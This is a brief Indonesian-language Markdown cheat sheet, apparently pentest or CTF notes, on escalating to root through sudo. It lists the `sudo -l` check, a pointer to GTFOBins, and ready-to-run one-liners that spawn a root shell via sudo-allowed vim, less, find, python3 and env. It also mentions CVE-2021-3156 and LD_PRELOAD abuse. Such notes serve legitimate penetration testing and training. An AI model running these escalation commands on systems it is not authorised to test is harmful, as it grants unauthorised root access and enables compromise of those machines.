# Exploiting Sudo

## Cek izin sudo
```bash
sudo -l
```

## Cek GTFOBins
Untuk tiap entry -> cek https://gtfobins.github.io bagian "Sudo"

## Contoh Eksploitasi
```bash
sudo vim -c ':!/bin/sh'                       # vim
sudo less /etc/profile  -> !/bin/sh           # less/more
sudo find . -exec /bin/sh \; -quit            # find
sudo python3 -c 'import os;os.system("/bin/sh")'
sudo env /bin/sh
```

> sudo aman dari dash-drop (ruid=euid=0)

## Cek juga
- sudo versi rentan: CVE-2021-3156 (Baron Samedit)
- `LD_PRELOAD` jika ada di `env_keep`
